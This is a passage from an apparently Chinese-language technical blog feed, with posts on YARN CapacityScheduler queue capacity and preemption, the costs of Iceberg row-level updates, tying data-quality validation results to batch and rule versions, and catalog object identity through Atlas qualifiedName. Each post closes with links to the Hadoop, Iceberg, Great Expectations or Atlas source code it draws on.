<p><code>maximum-capacity</code> 适合控制这种扩散。它不是越接近 capacity 越安全。上界过紧会制造资源孤岛，其他队列空闲时也不允许任务加速；上界 100% 又可能让单个队列占满集群。要结合 Container 时长、抢占代价和外部系统承载能力决定。</p>
<p>每个队列还能限制单 Container 的 <code>maximum-allocation-mb</code> 与 <code>maximum-allocation-vcores</code>。这解决的是单次请求规格，不等于限制队列总量。反过来，队列 maximum-capacity 足够大，单 Container 上限太小，大内存作业仍然无法提交。平台页面要把两层限制分开展示。</p>
<p>我也会区分“常态突发”和“异常扩散”。某队列每周固定补数，应该进入容量计划；一个 SQL 因笛卡尔积突然申请数千 Container，应该由查询防护、用户限制和最大并发拦截，不能把它算成未来必须保障的峰值。</p>
<h2 id="用户限制和-AM-资源会让任务在入口排队"><a href="#用户限制和-AM-资源会让任务在入口排队" class="headerlink" title="用户限制和 AM 资源会让任务在入口排队"></a>用户限制和 AM 资源会让任务在入口排队</h2><p>队列有资源，某个用户仍可能拿不到，是因为 CapacityScheduler 还有 <code>minimum-user-limit-percent</code> 与 <code>user-limit-factor</code>。它们控制单个用户在队列中能占多少，避免一个账号垄断共享队列。</p>
<p>如果所有调度任务都使用同一个技术账号提交，用户公平会失去意义：几十个业务团队在 YARN 看起来是同一个 user。要么把项目&#x2F;租户映射到可区分身份，要么在平台层做更细的并发与配额控制。只建很多逻辑项目、底层都用 <code>hadoop</code> 用户，队列无法按组织公平。</p>
<p>ApplicationMaster 也占资源。<code>maximum-am-resource-percent</code> 控制队列中可用于 AM 的比例，达到上限后，新应用会停在 pending&#x2F;ACCEPTED，即使普通 task Container 还有资源。大量小作业同时提交时，每个作业数据量不大，AM 总量却可能先成为入口瓶颈。</p>
<p>因此排队看板应拆成至少三类：</p>
<ul>
<li>因 AM 资源上限尚未启动；</li>
<li>Application 已运行，但 task Container 因队列&#x2F;用户限制等待；</li>
<li>队列允许分配，但没有满足资源形状或标签的节点。</li>
</ul>
<p>三类问题都显示成“资源不足”，管理员只能反复提高 capacity，实际瓶颈可能完全没动。</p>
<h2 id="抢占策略先观察，再决定杀谁"><a href="#抢占策略先观察，再决定杀谁" class="headerlink" title="抢占策略先观察，再决定杀谁"></a>抢占策略先观察，再决定杀谁</h2><p>Hadoop 3.3.0 的 <code>ProportionalCapacityPreemptionPolicy</code> 提供 monitoring interval、kill 前等待时间、单轮最大抢占比例、deadzone 和自然完成因子等参数。它不是一个简单的开关。</p>
<p>回收太慢，保证队列错过 SLA；回收太激进，长任务刚计算完的数据被杀，重新调度后浪费更多资源。流任务、有状态作业和大 Shuffle stage 的抢占成本又比短 Map task 高。</p>
<p>我会先使用 <code>observe_only</code> 运行策略，记录如果启用会选择哪些 Container、预计回收多少、对应哪些业务任务。把这份模拟结果与 SLA 事件对照，再逐步开启实际抢占。若策略持续选中高成本 Container，需要调整队列、任务粒度或优先级，不是继续缩短 kill 等待。</p>
<p>抢占后的效果也要闭环：被保障队列 pending 是否下降，完成时间是否改善，被抢占任务增加了多少重算时间。只统计“抢占了 300 个 Container”，无法判断策略有没有帮助业务。</p>
<h2 id="配额调整需要一次受控回放"><a href="#配额调整需要一次受控回放" class="headerlink" title="配额调整需要一次受控回放"></a>配额调整需要一次受控回放</h2><p>改 capacity 以后看第二天有没有投诉，不算验证。我会选取一段代表性的高峰，把各队列 application 到达时间、Container 请求和运行时长做匿名化回放，比较旧配置与新配置下的启动延迟、完成时间、借用量和抢占量。</p>
<p>线上变更则保留前后版本和明确回退条件。CapacityScheduler 支持运行时修改队列属性，但配置能 refresh 成功，只证明语法有效。需要继续观察 guaranteed capacity 恢复时间、pending resource、AM 排队和关键作业 SLA。</p>
<p>配额也不是一次性项目。任务新增、数据量增长、机器规格和业务窗口都会变化。每月用最近数据重算需求分布，按季度审查队列结构；真正的突发事件单独标记，不让一次故障把长期容量基线拉高。</p>
<p>一个好的共享队列方案，不是让每个部门永远占着一块机器，而是在它真正需要资源的窗口给出可预测保证，平时又允许别人使用空闲容量。平均使用率只能帮助看成本，峰值重叠和等待 SLA 才决定配额。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-site/src/site/markdown/CapacityScheduler.md#L28-L53">CapacityScheduler 3.3.0：保证容量、弹性与多租户设计</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-site/src/site/markdown/CapacityScheduler.md#L119-L135">CapacityScheduler 3.3.0：capacity、maximum-capacity 与用户限制</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-site/src/site/markdown/CapacityScheduler.md#L137-L145">CapacityScheduler 3.3.0：AM resource percent 与应用并发限制</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-site/src/site/markdown/CapacityScheduler.md#L265-L283">CapacityScheduler 3.3.0：抢占策略与 observe_only</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-server/hadoop-yarn-server-resourcemanager/src/main/java/org/apache/hadoop/yarn/server/resourcemanager/scheduler/capacity/CapacitySchedulerConfiguration.java#L213-L219"><code>CapacitySchedulerConfiguration</code>：默认 ResourceCalculator 与配置入口</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-common/src/main/resources/yarn-default.xml#L404-L437"><code>yarn-default.xml</code>：Container 最小&#x2F;最大内存与 vCore 分配</a></li>
</ul>
]]></content>
      <categories>
        <category>资源调度</category>
      </categories>
      <tags>
        <tag>YARN</tag>
        <tag>容量规划</tag>
        <tag>SLA</tag>
      </tags>
  </entry>
  <entry>
    <title>湖仓表的 UPDATE 为什么比数据库贵：Data File、Delete File 与重写放大</title>
    <url>//2022/02/22/lakehouse-row-update-cost/</url>
    <content><![CDATA[<p>在数据库里执行一条 <code>UPDATE orders SET status=&#39;PAID&#39; WHERE id=...</code>，我们很容易把它想成“找到这一行，改掉几个字段”。把同样的语句放到湖仓表上，这个直觉会出问题。Parquet 数据文件是不可变的，Iceberg 管的是文件和元数据，不会钻进一个已经提交的 Parquet 文件里原地改几个字节。</p>
<p>于是，更新一行到底有多贵，不能只看 affected rows。它可能触发整个数据文件重写，也可能先增加 delete file，把合并成本推迟到查询和维护阶段。真正要算的是：命中了多少 data file、每个文件多大、产生多少 delete、读端要合并多少层，以及这些文件何时能被重新整理掉。</p>
<p class="article-diagram-scroll"><img src="/images/articles/lakehouse-row-update-cost.svg" class="lazyload" data-srcset="/images/articles/lakehouse-row-update-cost.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="湖仓行级 UPDATE 的两条执行路径"></p>
<span id="more"></span>

<h2 id="Iceberg-没有在-Parquet-里原地改一行"><a href="#Iceberg-没有在-Parquet-里原地改一行" class="headerlink" title="Iceberg 没有在 Parquet 里原地改一行"></a>Iceberg 没有在 Parquet 里原地改一行</h2><p>Iceberg 0.13.0 的格式规范把表状态组织为 snapshot、manifest list、manifest 和 content files。数据文件一旦写入就不再修改，新的表状态通过一次 snapshot commit 生效。行级更新因此只能表达为文件集合的变化。</p>
<p>最直接的办法是 Copy-on-Write。假设一条 512 MB 的 Parquet 文件有一百万行，这次 <code>UPDATE</code> 只命中一行，执行引擎仍要读取原文件，把未变化的 999999 行与新值重新写进一个或多个文件，然后在新 snapshot 里移除旧文件、增加新文件。业务上只变了一行，物理上可能读写了接近 1 GB。</p>
<p>这也是我看湖仓更新成本时先问“命中了几个文件”，而不是先问“改了几行”的原因。如果更新条件无法靠 partition、列统计或文件级索引裁剪，定位一行之前还要扫描大量 manifest 和 data file，扫描放大与重写放大会叠在一起。</p>
<p>Copy-on-Write 的好处很明确：提交完成后，reader 只读整理好的 data file，不需要在查询时额外应用 delete。它适合更新不频繁、读延迟敏感，或者一次更新本来就覆盖较大数据范围的表。它的问题也同样明确：零散更新会产生很高的写放大，还容易和同一批文件上的 compaction、overwrite 相互冲突。</p>
<h2 id="Merge-on-Read-把成本从写时搬到读时"><a href="#Merge-on-Read-把成本从写时搬到读时" class="headerlink" title="Merge-on-Read 把成本从写时搬到读时"></a>Merge-on-Read 把成本从写时搬到读时</h2><p>Iceberg v2 引入 delete file，用来描述不可变 data file 中哪些行已经被逻辑删除。更新可以拆成两个动作：为旧行写 delete，再把新版本作为 data row 插入。<code>RowLevelOperationMode</code> 在源码里直接把两种模式写清楚：Copy-on-Write 当场替换命中的数据文件；Merge-on-Read 写 delete file 与新 data file，查询时再应用 delete。</p>
<p>Position Delete 保存 data file 路径和行位置，意思是“这个文件的第 N 行无效”。它定位准确，读端无需拿业务键和每一行比较，但它依赖原 data file 的身份和位置。如果维护任务重写了被引用文件，旧 position delete 也要一起处理，否则它指向的物理位置已经不存在。</p>
<p>Equality Delete 保存用于等值匹配的字段，例如主键 <code>order_id</code>。它不绑定某个文件位置，对 CDC 这类按业务键传播变更更自然；代价是 planner 必须找出它可能作用的数据文件，reader 还要按 equality field 合并。字段选择不当、键分布太散或统计信息不足，会让一个很小的 delete file 影响一大片扫描范围。</p>
<p>Merge-on-Read 的写入通常更快，因为更新一行不必马上重写 512 MB 文件。但成本没有消失，只是换了付款时间：scan task 会同时携带 data file 与需要应用的 delete files；查询要读取、匹配并过滤；delete 文件越碎，规划和打开文件的开销越高；后台最终还得把 delete 物化进新的 data file。</p>
<h2 id="先算四类放大，再决定模式"><a href="#先算四类放大，再决定模式" class="headerlink" title="先算四类放大，再决定模式"></a>先算四类放大，再决定模式</h2><p>我会把一类更新负载拆成四个数字，而不是笼统讨论哪种模式“性能更好”。</p>
<p>第一是扫描放大。条件命中 10 行，但为了找到它们读了多少 manifest、多少文件 footer、多少数据列？如果业务经常按 <code>tenant_id + order_id</code> 更新，而表只按日期分区，那么日期分区内的文件布局才是瓶颈。</p>
<p>第二是写放大。Copy-on-Write 的粗略值可以写成：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">写放大 = 重写 data file 的总字节数 / 实际变更行的字节数</span><br></pre></td></tr></table></figure>

<p>这个值可能非常夸张，但不能脱离最终文件质量看。一次批量更新重写整个目标分区，顺手把小文件合并并恢复排序，未必比积累数万个 delete file 更贵。</p>
<p>第三是读放大。Merge-on-Read 要记录每个 scan task 关联的 delete file 数量、delete 记录数、实际过滤行数和合并耗时。只看 query scanned bytes 会漏掉 delete lookup、hash set、额外 IO 和 CPU。</p>
<p>第四是维护放大。后台 rewrite data files、rewrite position delete files 会再次读取和写入数据，还要提交新 snapshot。维护追不上写入时，表会进入一种看似能写、实际越来越难读的状态。这个欠账应该作为可见指标，而不是等查询变慢再临时跑一次 compaction。</p>
<h2 id="Sequence-Number-决定-Delete-应用到谁"><a href="#Sequence-Number-决定-Delete-应用到谁" class="headerlink" title="Sequence Number 决定 Delete 应用到谁"></a>Sequence Number 决定 Delete 应用到谁</h2><p>有 delete file 以后，不能简单地把一个分区内所有 delete 应用到所有 data file。Iceberg v2 为 snapshot 和 content file 引入 sequence number，用来判断数据与删除的先后关系。</p>
<p>规范要求，position delete 可以作用于序号小于等于它的 data file；equality delete 作用于序号严格小于它的 data file。这个差异解决了同一次 RowDelta 中插入新行和删除旧行的关系：更新产生的新行不能又被同批 equality delete 误删，而 position delete 可以精确引用同一提交中的已有位置。</p>
<p><code>FileScanTask.deletes()</code> 也说明了读端的真实工作：一个扫描任务不是只有 data file，它还携带要对该文件应用的 delete file 列表。平台做查询诊断时，如果只展示主 data file 数和字节数，用户会看到“只扫了两个文件却很慢”，却看不到背后挂了几十个 delete files。</p>
<p>序号还影响维护。重写 data file 时，不能让仍然有效的 equality delete 因为新文件序号变化而失效，也不能保留已经物化的 position delete 重复过滤。Iceberg 的 rewrite 与并发校验围绕这些关系工作；自己在目录层拼文件、改 manifest，很容易破坏行级语义。</p>
<h2 id="更新任务还要面对并发提交"><a href="#更新任务还要面对并发提交" class="headerlink" title="更新任务还要面对并发提交"></a>更新任务还要面对并发提交</h2><p>一次 UPDATE 往往先读表，找到受影响的行和文件，再生成 data&#x2F;delete files，最后提交。读和提交之间如果有另一笔写入，就必须判断那笔变化是否与本次更新冲突。</p>
<p><code>RowDelta</code> 允许记录读取时的 snapshot，验证 position delete 引用的数据文件仍然存在，并用 conflict detection filter 检查期间新增的 data&#x2F;delete files。源码特别提醒：UPDATE 与 MERGE 应验证并发新增的 delete files，否则本次操作可能在不知道旧行已变化的情况下提交。</p>
<p>这不是把 <code>CommitFailedException</code> 重试几次就能解决的问题。Catalog pointer 冲突可以刷新后重试；业务读集发生冲突时，原先基于旧 snapshot 做出的更新决定已经不成立，应重新执行读取和计算，或者明确失败。平台必须区分“提交抢锁失败”和“行级假设失效”，不然自动重试可能提交一笔语法成功、业务错误的更新。</p>
<p>我会为行级操作留下 base snapshot ID、conflict filter、matched data files、added data&#x2F;delete files、重写字节数和最终 snapshot ID。没有这些证据，出现重复更新或漏更新时只能回头猜 SQL 当时读到了什么。</p>
<h2 id="落地时不要把-Compaction-当清洁工"><a href="#落地时不要把-Compaction-当清洁工" class="headerlink" title="落地时不要把 Compaction 当清洁工"></a>落地时不要把 Compaction 当清洁工</h2><p>如果选 Merge-on-Read，我会同时定义 delete debt 的上限：单个 data file 可关联多少 delete files、delete records 与 data records 的比例、读取合并耗时达到什么值触发 rewrite。Compaction 不是定时清理目录，而是在不破坏并发语义的前提下，把逻辑删除物化进新的数据文件。</p>
<p>文件大小也不能只追求一个固定目标。文件越大，点状 Copy-on-Write 的重写成本越高；文件越小，规划、metadata 和对象存储请求的开销越大。更新热点明显的表，可以通过排序、分区演进或写分布，让同一业务键附近的数据更集中，降低更新条件命中的文件数。</p>
<p>最终的选择通常不是整张表永远只用一种模式。稳定历史分区可以用 Copy-on-Write 保持读取简单，近期频繁变更的数据采用 Merge-on-Read，再由维护任务在数据冷却后整理。模式必须跟负载、SLA 和维护能力一起定。</p>
<p>湖仓支持 <code>UPDATE</code>，只代表 SQL 层能表达这件事。要把它运行好，还得看到不可变文件下面真实发生的扫描、重写、delete 合并和并发验证。忽略这些物理成本，语法越像数据库，故障反而越难解释。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/iceberg/blob/72237429ba164c054480dcfbdb9fe1c86c04dcda/site/docs/spec.md#L27-L40">Iceberg 0.13.0 Spec：v2 用 Delete File 表达不可变文件中的行级删除</a></li>
<li><a href="https://github.com/apache/iceberg/blob/72237429ba164c054480dcfbdb9fe1c86c04dcda/site/docs/spec.md#L685-L734">Iceberg 0.13.0 Spec：Position Delete 与 Equality Delete 的格式</a></li>
<li><a href="https://github.com/apache/iceberg/blob/72237429ba164c054480dcfbdb9fe1c86c04dcda/site/docs/spec.md#L539-L561">Iceberg 0.13.0 Spec：Sequence Number 与 Delete File 的应用规则</a></li>
<li><a href="https://github.com/apache/iceberg/blob/72237429ba164c054480dcfbdb9fe1c86c04dcda/core/src/main/java/org/apache/iceberg/RowLevelOperationMode.java#L24-L41"><code>RowLevelOperationMode</code>：Copy-on-Write 与 Merge-on-Read 的成本边界</a></li>
<li><a href="https://github.com/apache/iceberg/blob/72237429ba164c054480dcfbdb9fe1c86c04dcda/api/src/main/java/org/apache/iceberg/FileScanTask.java#L25-L41"><code>FileScanTask.deletes()</code>：扫描任务携带要应用的 Delete Files</a></li>
<li><a href="https://github.com/apache/iceberg/blob/72237429ba164c054480dcfbdb9fe1c86c04dcda/api/src/main/java/org/apache/iceberg/RowDelta.java#L24-L161"><code>RowDelta</code>：行级变更的文件提交与并发验证契约</a></li>
</ul>
]]></content>
      <categories>
        <category>湖仓架构</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>行级更新</tag>
        <tag>湖仓表</tag>
      </tags>
  </entry>
  <entry>
    <title>数据质量校验为什么必须绑定批次：一条 FAIL 不够定位问题</title>
    <url>//2022/01/26/data-quality-batch-context/</url>
    <content><![CDATA[<p>数据质量平台发出一条告警：“订单表行数校验失败，实际 980 万，期望大于 1000 万。”收到的人通常还要追问：检查的是哪个分区，数据任务跑完了吗，规则什么时候改过，这次是补数还是正常调度？</p>
<p>如果这些信息不在结果里，一条 FAIL 只是现象。甚至同一条规则重跑后变成 PASS，也无法判断数据被修复了，还是第二次读取了另一批数据。</p>
<p>Great Expectations 0.14.2 把一次验证拆成 Batch、Expectation Suite、RunIdentifier、Validation Result 和后续 Action。这个结构很值得数据平台参考：规则不是悬空执行，结果也不能只保存布尔值。一次质量结论必须能回答“用哪版规则，在什么时候，对哪批数据，算出了什么”。</p>
<p class="article-diagram-scroll"><img src="/images/articles/data-quality-batch-context.svg" class="lazyload" data-srcset="/images/articles/data-quality-batch-context.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据质量结果需要绑定的批次上下文"></p>
<span id="more"></span>

<h2 id="Batch-首先要有可复算的数据边界"><a href="#Batch-首先要有可复算的数据边界" class="headerlink" title="Batch 首先要有可复算的数据边界"></a>Batch 首先要有可复算的数据边界</h2><p>“检查 <code>orders</code> 表”并没有指定一批数据。分区表要明确 <code>dt=2022-01-25</code>，Iceberg 表可以指定 snapshot ID，Kafka 数据要有每个 partition 的 offset 范围，数据库查询则需要可重复读取的 cutoff 或版本。</p>
<p>只保存校验开始时间不够。质量任务 01:10 开始、01:20 结束，生产任务可能在 01:15 覆盖目标分区；不同规则并发执行时，读到的甚至不是同一版本。最终聚合出“一张表 8 条规则，6 条通过”，实际每条规则检查的输入可能不同。</p>
<p>我会让质量任务先解析并冻结 batch definition，再执行所有规则：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">asset: warehouse.dwd_orders</span><br><span class="line">partition: dt=2022-01-25</span><br><span class="line">data_version: hdfs_path_commit=...</span><br><span class="line">producer_instance_id: ...</span><br><span class="line">producer_attempt_id: 2</span><br></pre></td></tr></table></figure>

<p>若存储支持 snapshot，就直接使用不可变 snapshot ID。普通 Hive 分区至少要在生产任务原子提交后再触发质量检查，并记录文件清单摘要或提交标记。检查过程中分区仍可写，结论就不具备复算性。</p>
<p>Great Expectations 的 Checkpoint 配置要求每个 validation 指定 <code>batch_request</code> 和 <code>expectation_suite_name</code>，正是把“数据是什么”和“规则是什么”放在同一次验证中。平台不必照搬产品名，但这两个维度不能省。</p>
<h2 id="规则也有版本，名字相同不代表口径相同"><a href="#规则也有版本，名字相同不代表口径相同" class="headerlink" title="规则也有版本，名字相同不代表口径相同"></a>规则也有版本，名字相同不代表口径相同</h2><p>规则 <code>orders_row_count</code> 今天可能要求大于 1000 万，下周因业务变化调成 900 万。如果结果只关联规则 ID，查看历史失败时会显示当前阈值，用户会以为当时应该通过。</p>
<p>规则发布时需要生成不可变版本，保存 expectation type、参数、过滤条件、严重级别、适用范围和代码&#x2F;UDF 版本。运行实例引用具体版本，不能引用一条会被原地修改的 current record。</p>
<p>以下变更都应该产生新版本：</p>
<ul>
<li>阈值从固定值改为环比区间；</li>
<li>null 检查增加过滤条件；</li>
<li>唯一键从 <code>order_id</code> 改成组合键；</li>
<li>SQL 或 UDF 实现变化；</li>
<li>failure 从告警升级为阻断下游。</li>
</ul>
<p>Great Expectations 的 Checkpoint 带 <code>config_version</code>，Expectation Suite 也作为 validation 的明确输入；Checkpoint 配置可以进入版本控制。工程上还应保存实际展开后的运行配置，因为 YAML 模板、环境变量和运行参数合并后，最终规则可能与仓库文件不同。</p>
<p>我会对展开后的规则集合做 hash。重跑时若 batch 一样、rule set hash 不同，页面明确标注“使用新规则重验”，不能拿新结果覆盖旧结果。</p>
<h2 id="RunIdentifier-需要接上调度实例"><a href="#RunIdentifier-需要接上调度实例" class="headerlink" title="RunIdentifier 需要接上调度实例"></a>RunIdentifier 需要接上调度实例</h2><p>Great Expectations 0.14.2 的 <code>RunIdentifier</code> 用 <code>run_name</code> 和 <code>run_time</code> 标识一组 validations，并统一把时间转成 UTC。这能区分多次运行，但在企业调度平台里，我还会加入 <code>schedule_instance_id</code> 与 <code>attempt_id</code>。</p>
<p>同一个业务日期可能正常跑一次、失败重试两次、人工补数一次。它们检查的 partition 名相同，数据版本和规则版本可能不同。只用 <code>2022-01-25</code> 做 run name 会合并四次证据。</p>
<p>一次 validation run 应至少保存：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">validation_run_id</span><br><span class="line">schedule_instance_id / attempt_id</span><br><span class="line">checkpoint_name / config_version</span><br><span class="line">batch_definition / data_version</span><br><span class="line">expectation_suite / rule_set_hash</span><br><span class="line">started_at / ended_at</span><br><span class="line">engine_execution_id</span><br></pre></td></tr></table></figure>

<p>运行失败还要区分“规则执行异常”和“数据未通过”。SQL 语法错误、连接超时、权限不足时，规则没有产生有效判断，状态应该是 ERROR 或 UNKNOWN；把它记成 FAIL，会误导用户以为数据已经被检查且不合格。</p>
<h2 id="Validation-Result-要保留观察值和异常上下文"><a href="#Validation-Result-要保留观察值和异常上下文" class="headerlink" title="Validation Result 要保留观察值和异常上下文"></a>Validation Result 要保留观察值和异常上下文</h2><p>Great Expectations 的单条 <code>ExpectationValidationResult</code> 包含 <code>success</code>、expectation config、result、meta 和 exception info；Suite 级结果再汇总 results、statistics 和 meta。这个模型比单一布尔值更接近排障需要。</p>
<p>对于行数规则，至少保存 observed value、阈值、查询或指标定义、扫描行数、耗时和异常信息。唯一性规则要保存重复数与有限样本，但不能把所有异常主键塞进结果；完整问题数据可以写到受权限控制的隔离表，结果里放引用。</p>
<p>采样也要说明方法。随机抽 100 条没有发现 null，不能显示成“全表 null 校验通过”。结果应标注 full scan、partition scan、sample，以及 sample size 和采样策略。</p>
<p>Meta 字段适合补充平台上下文，但字段名称要标准化。每个团队自由写 <code>jobId</code>、<code>task_id</code>、<code>instance</code>，后续查询无法统一关联。核心身份与数据版本最好进入固定 schema，扩展信息才放 meta。</p>
<p>结果存储应追加，不覆盖。Great Expectations CheckpointResult 的 <code>run_results</code> 以 ValidationResultIdentifier 为 key，保存 validation result 与 action result；平台同样要让每次 attempt 都留下独立记录，告警、阻断、写隔离区等 action 也保存结果。</p>
<h2 id="阈值需要批次上下文，不能只看历史均值"><a href="#阈值需要批次上下文，不能只看历史均值" class="headerlink" title="阈值需要批次上下文，不能只看历史均值"></a>阈值需要批次上下文，不能只看历史均值</h2><p>动态阈值常用过去 7 天均值上下浮动 20%。如果把补数批次、节假日和正常日批混在一起，基线本身就失真。规则计算历史区间时，也要记录用了哪些 batch 和统计版本。</p>
<p>我通常把上下文分成几个维度：调度类型（正常&#x2F;补数&#x2F;重跑）、业务日类型、上游是否完整、分区粒度和数据版本。一个补跑三天数据的任务，不应该套用单日行数阈值；小时分区与日分区也不能共享同一个波动比例。</p>
<p>动态阈值的输出最好包括：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">observed=9,800,000</span><br><span class="line">expected_range=[9,650,000, 10,450,000]</span><br><span class="line">baseline_batches=[...]</span><br><span class="line">algorithm_version=v3</span><br><span class="line">excluded_batches=[holiday, backfill]</span><br></pre></td></tr></table></figure>

<p>这样规则今天突然变宽时，可以追查是数据变化，还是基线样本与算法变了。只保存最终上下限，无法复算。</p>
<h2 id="质量结果要控制下游，但必须有状态机"><a href="#质量结果要控制下游，但必须有状态机" class="headerlink" title="质量结果要控制下游，但必须有状态机"></a>质量结果要控制下游，但必须有状态机</h2><p>并非所有失败都应该阻断。核心主键重复可以标为 ERROR，禁止发布；字段描述缺失可能只是 WARNING；质量引擎自身不可用则是 UNKNOWN，是否阻断取决于数据等级和 fail-open&#x2F;fail-closed 策略。</p>
<p>我会把生产与校验组织成明确状态：数据提交完成后进入 <code>PENDING_VALIDATION</code>，规则执行得到 <code>PASSED</code>、<code>FAILED</code> 或 <code>UNKNOWN</code>，再由策略决定 <code>PUBLISHED</code>、<code>QUARANTINED</code> 或等待人工确认。不要让下游只监听“生产任务 SUCCESS”，绕过质量结果。</p>
<p>人工放行必须保存操作者、理由、影响范围和到期时间。一次临时放行不能把规则永久关闭；下次 batch 仍按原策略执行。修复后重验则创建新的 validation attempt，保留第一次失败证据。</p>
<p>最终，一个可用的数据质量结论应能从告警链接一路看到：哪次生产实例提交了哪个数据版本，哪版规则对它执行，实际观察值与样本是什么，失败触发了什么 action，后来又用什么条件重验。做到这一步，PASS&#x2F;FAIL 才是证据的摘要，而不是全部证据。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/great-expectations/great_expectations/blob/8afe1540b4e5f7fdeacff02af8a0c8a8dc30b2dc/docs/reference/checkpoints_and_actions.md#L16-L30">Great Expectations 0.14.2 Checkpoint：Batch、Expectation Suite、Validation Result 与 Action</a></li>
<li><a href="https://github.com/great-expectations/great_expectations/blob/8afe1540b4e5f7fdeacff02af8a0c8a8dc30b2dc/docs/reference/checkpoints_and_actions.md#L42-L78">Great Expectations 0.14.2 Checkpoint 配置：batch_request、suite 与 config version</a></li>
<li><a href="https://github.com/great-expectations/great_expectations/blob/8afe1540b4e5f7fdeacff02af8a0c8a8dc30b2dc/great_expectations/core/run_identifier.py#L11-L67"><code>RunIdentifier</code>：用 run_name 与 UTC run_time 标识一组验证</a></li>
<li><a href="https://github.com/great-expectations/great_expectations/blob/8afe1540b4e5f7fdeacff02af8a0c8a8dc30b2dc/great_expectations/core/expectation_validation_result.py#L40-L66"><code>ExpectationValidationResult</code>：success、result、meta 与 exception_info</a></li>
<li><a href="https://github.com/great-expectations/great_expectations/blob/8afe1540b4e5f7fdeacff02af8a0c8a8dc30b2dc/great_expectations/core/expectation_validation_result.py#L273-L314"><code>ExpectationSuiteValidationResult</code>：规则明细、statistics 与 meta</a></li>
<li><a href="https://github.com/great-expectations/great_expectations/blob/8afe1540b4e5f7fdeacff02af8a0c8a8dc30b2dc/great_expectations/checkpoint/types/checkpoint_result.py#L26-L52"><code>CheckpointResult</code>：按 ValidationResultIdentifier 保存验证与 action 结果</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>数据质量</tag>
        <tag>Great Expectations</tag>
        <tag>批次上下文</tag>
      </tags>
  </entry>
  <entry>
    <title>统一 Catalog 之前，先把对象身份说清楚：qualifiedName 不是显示名称</title>
    <url>//2022/03/04/catalog-object-identity/</url>
    <content><![CDATA[<p>做统一 Catalog 时，团队通常先讨论要接哪些数据源、搜索框怎么做、血缘图画到字段还是表。我更愿意先追问一个看起来很基础的问题：<code>prod</code> 和 <code>test</code> 里都叫 <code>sales.orders</code> 的两张表，到底是不是同一个对象？</p>
<p>这个问题没答清楚，后面所有治理功能都会漂。采集任务重复跑一次可能多出一张表；集群迁移后，原来的标签和负责人找不到了；表重命名既可能把历史血缘切断，也可能错误地把两个对象合并。Catalog 不是把各种名称塞进一个搜索索引，它首先是一套对象身份系统。</p>
<p class="article-diagram-scroll"><img src="/images/articles/catalog-object-identity.svg" class="lazyload" data-srcset="/images/articles/catalog-object-identity.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Catalog 对象标识从采集输入到稳定引用"></p>
<span id="more"></span>

<h2 id="name-解决展示，qualifiedName-解决唯一定位"><a href="#name-解决展示，qualifiedName-解决唯一定位" class="headerlink" title="name 解决展示，qualifiedName 解决唯一定位"></a><code>name</code> 解决展示，<code>qualifiedName</code> 解决唯一定位</h2><p>Apache Atlas 2.2.0 的基础类型 <code>Referenceable</code> 把 <code>qualifiedName</code> 定义为必填、可索引且唯一的属性。Hive Bridge 为 database 生成 <code>db@metadataNamespace</code>，为 table 生成 <code>db.table@metadataNamespace</code>，column 则在 table qualifiedName 上继续增加列名。</p>
<p>例如两个环境都有 <code>sales.orders</code>：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sales.orders@prod-hive-a</span><br><span class="line">sales.orders@test-hive-a</span><br></pre></td></tr></table></figure>

<p>它们的 <code>name</code> 都可以展示为 <code>orders</code>，但身份不同。这里的 <code>metadataNamespace</code> 不是为了让字符串显得完整，而是把对象放回它所属的元数据域。环境、集群或服务实例如果不进入这个域，同名对象只能靠偶然不重复来维持，迟早会冲突。</p>
<p>Atlas 的实体接口也把这条边界暴露得很直接：除 GUID 外，可以用 <code>typeName + unique attributes</code> 查找、更新或删除实体，文档注释给出的典型 unique attribute 就是 <code>qualifiedName</code>。<code>AtlasObjectId</code> 没有 GUID 时，<code>equals()</code> 也会比较 typeName 与 uniqueAttributes。</p>
<p>这意味着 <code>hive_table:sales.orders@prod-hive-a</code> 与 <code>rdbms_table:sales.orders@prod-hive-a</code> 仍然可以是两个不同类型的对象。统一 Catalog 不等于抹掉类型；相同字符串在不同类型里可能代表不同的访问协议、字段语义和治理动作。</p>
